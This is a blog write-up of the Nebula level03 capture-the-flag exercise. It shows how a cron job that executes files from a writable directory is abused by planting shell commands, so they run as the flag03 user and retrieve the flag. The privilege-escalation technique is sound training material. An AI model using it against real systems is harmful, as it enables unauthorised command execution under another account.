+++
author = "pwntester"
categories = ["nebula03"]
date = 2013-11-20T18:36:00Z
description = ""
draft = false
slug = "nebula-level03-write-up"
tags = ["nebula03"]
title = "Nebula level03 write-up"

+++

In [Level03](http://exploit-exercises.com/nebula/level03) we are said that the program on /flag03 is run by cron every X minutes. If we have a look at the code we can see that it will execute the files in the writable.d directory and then remove them:

```lang-bash line-numbers 
level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Ok, so whatever we put in **writable.d** will be execute by someone else ... but who? Lets find out adding this simple script:

```lang-bash line-numbers 
level03@nebula:/home/flag03/writable.d$ echo "id > /tmp/id" > getid
```

After waiting a cuple of minutes we can see that **flag03** runs the cron, how convinient!
```lang-bash line-numbers 
level03@nebula:/tmp$ cat id
uid=996(flag03) gid=996(flag03) groups=996(flag03)
```

Now, let make **flag03** get the flag for us:
```lang-bash line-numbers 
level03@nebula:/home/flag03/writable.d$ echo "getflag > /tmp/flag" > myGetFlag
```

Wait for it, wait for it ... and:
```lang-bash line-numbers 
level03@nebula:/tmp$ cat flag
You have successfully executed getflag on a target account
```
